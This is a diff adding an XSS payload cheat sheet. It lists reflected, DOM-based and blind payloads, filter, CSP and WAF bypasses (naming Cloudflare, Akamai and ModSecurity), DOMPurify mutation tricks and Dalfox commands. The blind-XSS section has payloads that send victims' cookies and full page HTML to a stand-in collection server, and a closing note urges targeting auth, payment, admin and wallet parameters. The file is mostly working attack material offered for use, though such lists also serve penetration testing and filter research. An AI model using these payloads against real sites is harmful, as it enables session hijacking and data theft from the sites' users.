@@ -1,0 +1,371 @@
+# XSS PAYLOADS — Reflected, Stored, DOM, Blind
+# Source: wadgamer10 + SOUL.md Calculus filtering
+
+---
+
+## BASIC REFLECTED XSS
+
+### Standard
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<math><mtext></mtext><mglyph><mfrac><mrow><mtext><svg onload=alert(1)>
+
+### Event Handlers
+onload, onerror, onmouseover, onmouseenter, onfocus, onclick, ondblclick, onmousedown, onmouseup, onkeydown, onkeypress, onkeyup, onchange, onsubmit, onreset, onselect, onblur, onunload, onabort, oncanplay, oncanplaythrough, ondurationchange, onemptied, onended, onloadeddata, onloadedmetadata, onloadstart, onpause, onplay, onplaying, onprogress, onratechange, onseeked, onseeking, onstalled, onsuspend, ontimeupdate, onvolumechange, onwaiting
+
+### Input-based
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+' onfocus=alert(1) autofocus>
+" onfocus=alert(1) autofocus>
+" onmouseover=alert(1)>
+' onmouseover=alert(1)>
+
+---
+
+## FILTER BYPASS TECHNIQUES
+
+### Case Variation
+<ScRiPt>alert(1)</ScRiPt>
+<SVG ONLOAD=ALERT(1)>
+<ImG SrC=X OnErRoR=ALERT(1)>
+
+### Encoding
+<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%2Fscript%253E
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E
+\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E
+
+### Whitespace/Breaking
+< script >alert(1)< /script >
+<	script	>alert(1)<	/script	>
+<
+script
+>alert(1)<
+/script
+>
+< /**/ script /**/ >alert(1)< /**/ /script /**/ >
+</* */script/* */>alert(1)/* */<//* */script/* */>
+
+### Tag Breaking
+"><script>alert(1)</script>
+"><img/src="x"/onerror=alert(1)>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+"><script>alert(1)</script>
+"><iframe/src=javascript:alert(1)>
+"><video><source/onerror=alert(1)>
+"><math><mtext></mtext><mglyph><mfrac><mrow><mtext><svg/onload=alert(1)>
+
+### Attribute Breaking
+" onfocus=alert(1) autofocus "
+' onfocus=alert(1) autofocus '
+" onmouseover=alert(1) "
+' onmouseover=alert(1) '
+" onclick=alert(1) "
+' onclick=alert(1) '
+" onerror=alert(1) "
+' onerror=alert(1) '
+
+### JavaScript Protocol
+javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+j	a	v	a	s	c	r	i	p	t	:	alert(1)
+java	script:alert(1)
+java	script:alert(1)
+javascript	:	alert(1)
+&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)
+%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)
+
+### Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:,<script>alert(1)</script>
+
+---
+
+## DOM-BASED XSS
+
+### Sources
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location.href
+location.search
+location.hash
+location.pathname
+location.protocol
+location.host
+location.hostname
+location.port
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+indexedDB
+WebSQL
+Cookies
+
+### Sinks
+document.write
+document.writeln
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+eval
+setTimeout
+setInterval
+Function
+execScript
+crypto.generateCRMFRequest
+Range.createContextualFragment
+Parser.parseFromString
+DOMParser.parseFromString
+jQuery.html
+jQuery.append
+jQuery.prepend
+jQuery.after
+jQuery.before
+jQuery.replaceWith
+$.html
+$.append
+$.prepend
+$.after
+$.before
+$.replaceWith
+
+### DOM Payloads
+# location.hash
+https://target.com/page#<img src=x onerror=alert(1)>
+https://target.com/page#javascript:alert(1)
+https://target.com/page#"><img src=x onerror=alert(1)>
+
+# location.search
+https://target.com/page?param=<script>alert(1)</script>
+https://target.com/page?param="><img src=x onerror=alert(1)>
+
+# document.referrer (via link)
+# <a href="https://target.com/page">Click</a> from attacker.com with referrer payload
+
+# postMessage
+window.postMessage({type: "xss", payload: "<script>alert(1)</script>"}, "*")
+
+---
+
+## BLIND XSS (XSS Hunter / Custom Server)
+
+### Payloads (with callback)
+<script src=https://your-xss-server.com/collect.js></script>
+<script src=https://your-xss-server.com/hook.js></script>
+<img src=x onerror="new Image().src='https://your-xss-server.com/log?c='+document.cookie">
+<svg onload="fetch('https://your-xss-server.com/log?c='+document.cookie)">
+<script>new Image().src='https://your-xss-server.com/log?c='+btoa(document.documentElement.outerHTML)</script>
+<script>fetch('https://your-xss-server.com/log',{method:'POST',body:document.documentElement.outerHTML})</script>
+
+### In Different Contexts
+# JSON
+{"field": "<script src=https://xss.server/hook.js></script>"}
+
+# XML
+<root><data><![CDATA[<script src=https://xss.server/hook.js></script>]]></data></root>
+
+# CSV
+"field","<script src=https://xss.server/hook.js></script>"
+
+# Headers
+User-Agent: <script src=https://xss.server/hook.js></script>
+Referer: <script src=https://xss.server/hook.js></script>
+X-Forwarded-For: <script src=https://xss.server/hook.js></script>
+
+# Email
+"attacker<script src=https://xss.server/hook.js></script>@domain.com"
+
+---
+
+## FILTER EVASION (Advanced)
+
+### HTML Entity Encoding
+&<script>alert(1)</script>
+<script>alert(1)</script>
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+### Unicode Normalization
+＜script＞alert(1)＜/script＞
+﹤script﹥alert(1)﹤/script﹥
+
+### CSS Injection (Style attribute)
+style="background:url('javascript:alert(1)')"
+style="background:url(javascript:alert(1))"
+style="behavior:url('javascript:alert(1)')"
+expression(alert(1))  # IE only
+
+### SVG Specific
+<svg><script>alert(1)</script></svg>
+<svg/onload=alert(1)>
+<svg><animatetransform onbegin=alert(1)>
+<svg><set attributeName=href onbegin=javascript:alert(1)>
+<svg><a xlink:href=javascript:alert(1)><rect width=100 height=100></a></svg>
+
+### Mutation XSS (bypassing DOMPurify)
+<svg><p><style><img src="</style><img src=x onerror=alert(1)>">
+<math><mi><img src="</math><img src=x onerror=alert(1)>">
+<svg></p><style><img src="</style><img src=x onerror=alert(1)>">
+
+### Template Literal Injection (JS)
+${alert(1)}
+#{alert(1)}
+<%= alert(1) %>
+{{alert(1)}}
+[[alert(1)]]
+${{alert(1)}}
+
+---
+
+## CSP BYPASS
+
+### If 'unsafe-inline' allowed
+<script>alert(1)</script>
+
+### If 'unsafe-eval' allowed
+<script>eval('alert(1)')</script>
+<script>new Function('alert(1)')()</script>
+<script>setTimeout('alert(1)')</script>
+
+### If nonce/script-src allows specific domain
+<script src="https://allowed-cdn.com/../../xss"></script>
+<script src="https://allowed-cdn.com/jsonp?callback=alert(1)"></script>
+
+### If JSONP endpoint exists
+<script src="https://target.com/api?callback=alert(1)"></script>
+
+### If angular.js loaded
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+
+### If base tag injection
+<base href="https://attacker.com/">
+<script src="/static.js"></script>  # loads from attacker.com
+
+### If dangling markup
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><iframe srcdoc="<script>alert(1)</script>">
+
+---
+
+## WAF BYPASS (XSS Specific)
+
+### Cloudflare
+<svg/onload=alert(1)>
+<svg/onload=alert`1`>
+<svg/onload=alert&#x28;1&#x29;>
+<img/src=x/onerror=alert&#x28;1&#x29;>
+
+### Akamai
+<svg/onload=alert(1)>
+<details/open/ontoggle=alert(1)>
+<video/poster/onerror=alert(1)>
+
+### ModSecurity
+<svg/onload=alert(1)>
+<svg/onload=alert`1`>
+<math><mtext></mtext><mglyph><mfrac><mrow><mtext><svg/onload=alert(1)>
+
+### Generic (mixed case + encoding)
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+---
+
+## AUTOMATION PAYLOADS (Dalfox / Gxss)
+
+### For Gxss input (reflected params)
+"><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'"><svg onload=alert(1)>
+"><script>alert(1)</script>
+'"><script>alert(1)</script>
+
+### For Dalfox blind XSS
+-b https://your-xss-server.com
+--blind
+
+### Custom payloads file
+dalfox file urls.txt -b https://xss.server.com --custom-payload ./custom.txt
+
+---
+
+## TESTING CHECKLIST
+
+### Per Parameter
+[ ] Reflected in HTML body
+[ ] Reflected in attribute
+[ ] Reflected in JavaScript
+[ ] Reflected in URL
+[ ] Reflected in JSON
+[ ] Reflected in XML
+[ ] Reflected in PDF/CSV export
+[ ] Stored (profile, comment, ticket, etc.)
+[ ] DOM-based (hash, search, referrer)
+[ ] Blind (contact form, support ticket, admin panel)
+
+### Per Context
+[ ] HTML body
+[ ] HTML attribute (quoted/unquoted)
+[ ] JavaScript string
+[ ] JavaScript variable
+[ ] CSS
+[ ] URL
+[ ] Header
+[ ] Cookie
+
+### Bypass Attempts
+[ ] Case variation
+[ ] Encoding (URL, HTML, Unicode)
+[ ] Whitespace/breaking
+[ ] Tag/attribute breaking
+[ ] Event handlers
+[ ] JavaScript protocol
+[ ] Data URI
+[ ] SVG/MathML
+[ ] Mutation XSS
+[ ] Template injection
+[ ] CSP bypass
+
+---
+
+## IMPACT CLASSIFICATION
+
+| Context | Impact | Example |
+|---------|--------|---------|
+| Reflected HTML | Medium | Steal session via crafted link |
+| Stored HTML | High | Persistent, affects all viewers |
+| DOM-based | Medium-High | Bypass CSP, client-side only |
+| Blind | High | Admin panel, internal tools |
+| Self-XSS | Low | Requires social engineering |
+| CSP-bypass | Critical | Full compromise despite CSP |
+
+---
+
+**Remember:** Calculus filter — only test params with high-value context (auth, payment, admin, wallet). Low-value params = skip.
+
+*"One clean pop > 1000 failed payloads."*
